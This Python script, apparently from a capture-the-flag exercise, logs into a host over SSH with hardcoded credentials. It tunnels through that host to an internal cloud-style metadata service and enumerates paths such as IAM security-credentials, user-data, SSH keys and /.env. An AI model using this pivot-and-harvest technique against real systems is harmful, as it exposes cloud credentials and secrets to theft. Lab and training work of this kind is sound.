import paramiko
import socket
import time
import sys

"""
发现：172.17.0.2:80 返回版本列表
2015-07-25
2015-12-19
2016-07-29
latest

这看起来像AWS EC2元数据服务的版本格式！
AWS EC2元数据服务通常在169.254.169.254:80
但这里在172.17.0.2

让我探索这个服务
"""

HOST = "61.147.171.105"
PORT = 55300
USER = "ctf"
PASSWD = "123456"

def http_get(transport, host, port, path):
    """发送HTTP GET请求"""
    try:
        channel = transport.open_channel("direct-tcpip", (host, port), ('127.0.0.1', 0), timeout=5)
        channel.settimeout(5)
        
        request = f"GET {path} HTTP/1.0\r\nHost: {host}\r\n\r\n"
        channel.send(request.encode())
        
        time.sleep(0.5)
        response = b""
        while True:
            try:
                chunk = channel.recv(4096)
                if not chunk:
                    break
                response += chunk
            except:
                break
        
        channel.close()
        
        # 解析HTTP响应
        response_text = response.decode()
        if "\r\n\r\n" in response_text:
            body = response_text.split("\r\n\r\n", 1)[1]
            return body
        return response_text
    except Exception as e:
        return f"Error: {e}"

def explore_metadata():
    """探索元数据服务"""
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    transport = ssh.get_transport()
    
    print("[*] 探索元数据服务 172.17.0.2:80")
    
    # AWS风格的路径
    aws_paths = [
        "/",
        "/latest",
        "/latest/",
        "/latest/meta-data",
        "/latest/meta-data/",
        "/latest/user-data",
        "/latest/user-data/",
        "/latest/dynamic",
        "/latest/dynamic/",
        "/latest/api/token",
        "/2016-07-29/",
        "/2016-07-29/meta-data/",
        "/2015-12-19/",
        "/2015-07-25/",
    ]
    
    for path in aws_paths:
        result = http_get(transport, "172.17.0.2", 80, path)
        if result and "Error" not in result and "404" not in result:
            print(f"\n{path}:")
            print(result[:500])
    
    ssh.close()

def explore_metadata_deep():
    """深入探索元数据"""
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    transport = ssh.get_transport()
    
    print("\n[*] 深入探索元数据")
    
    # 先获取根目录列表
    result = http_get(transport, "172.17.0.2", 80, "/latest/")
    print(f"\n/latest/: {result}")
    
    # 尝试获取每个子路径
    if result:
        items = result.strip().split("\n")
        for item in items:
            if item:
                path = f"/latest/{item}"
                if not path.endswith("/"):
                    path = path + "/"
                sub_result = http_get(transport, "172.17.0.2", 80, path)
                if sub_result and "Error" not in sub_result:
                    print(f"\n{path}:")
                    print(sub_result[:500])
    
    ssh.close()

def explore_aws_instance_identity():
    """探索AWS实例身份"""
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    transport = ssh.get_transport()
    
    print("\n[*] 探索AWS实例身份")
    
    identity_paths = [
        "/latest/dynamic/instance-identity/",
        "/latest/dynamic/instance-identity/document",
        "/latest/dynamic/instance-identity/signature",
        "/latest/dynamic/instance-identity/pkcs7",
        "/latest/meta-data/iam/",
        "/latest/meta-data/iam/security-credentials/",
        "/latest/meta-data/identity-credentials/",
        "/latest/meta-data/public-keys/",
        "/latest/meta-data/public-keys/0/",
        "/latest/meta-data/public-keys/0/openssh-key",
    ]
    
    for path in identity_paths:
        result = http_get(transport, "172.17.0.2", 80, path)
        if result and "Error" not in result and "404" not in result:
            print(f"\n{path}:")
            print(result[:500])
    
    ssh.close()

def check_169_254_metadata():
    """检查标准AWS元数据地址"""
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    transport = ssh.get_transport()
    
    print("\n[*] 检查169.254.169.254元数据服务")
    
    try:
        channel = transport.open_channel("direct-tcpip", ("169.254.169.254", 80), ('127.0.0.1', 0), timeout=3)
        channel.settimeout(3)
        channel.send(b"GET / HTTP/1.0\r\nHost: 169.254.169.254\r\n\r\n")
        
        time.sleep(0.5)
        response = channel.recv(4096)
        print(f"响应: {response.decode()}")
        channel.close()
    except Exception as e:
        print(f"错误: {e}")
    
    ssh.close()

def explore_all_metadata_versions():
    """探索所有元数据版本"""
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    transport = ssh.get_transport()
    
    print("\n[*] 探索所有元数据版本")
    
    versions = ["2015-07-25", "2015-12-19", "2016-07-29", "latest"]
    
    for version in versions:
        print(f"\n=== {version} ===")
        
        result = http_get(transport, "172.17.0.2", 80, f"/{version}/")
        print(f"/{version}/: {result}")
    
    ssh.close()

def exhaustive_metadata_scan():
    """详尽扫描元数据"""
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    transport = ssh.get_transport()
    
    print("\n[*] 详尽扫描元数据")
    
    # 尝试各种可能的路径
    paths = [
        "/",
        "/latest/",
        "/latest/meta-data/",
        "/latest/user-data",
        "/latest/dynamic/",
        "/latest/api/",
        "/flag",
        "/flag.txt",
        "/secret",
        "/credentials",
        "/admin",
        "/.env",
        "/config",
    ]
    
    for path in paths:
        result = http_get(transport, "172.17.0.2", 80, path)
        if result:
            result_clean = result.strip()
            if result_clean and not result_clean.startswith("<!DOCTYPE") and "404" not in result_clean:
                print(f"\n{path}: {result_clean[:300]}")
    
    ssh.close()

if __name__ == "__main__":
    print("="*60)
    print("[*] 探索元数据服务")
    print("="*60)
    
    explore_metadata()
    explore_metadata_deep()
    explore_aws_instance_identity()
    check_169_254_metadata()
    explore_all_metadata_versions()
    exhaustive_metadata_scan()
